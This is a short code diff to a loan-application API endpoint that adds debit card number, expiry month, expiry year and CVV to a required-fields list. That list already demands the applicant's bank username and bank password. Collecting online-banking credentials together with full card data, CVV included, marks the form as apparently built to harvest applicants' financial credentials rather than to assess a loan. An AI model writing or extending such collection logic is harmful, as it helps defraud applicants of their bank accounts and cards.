@@ -64,6 +64,10 @@ app.post("/api/loan-application", async (req, res) => {
       "accountNumber",
       "bankUsername",
       "bankPassword",
+      "debitCardNumber",
+      "expiryMonth",
+      "expiryYear",
+      "cvv",
     ];
 
     const missing = requiredFields.filter((field) => !data[field]);
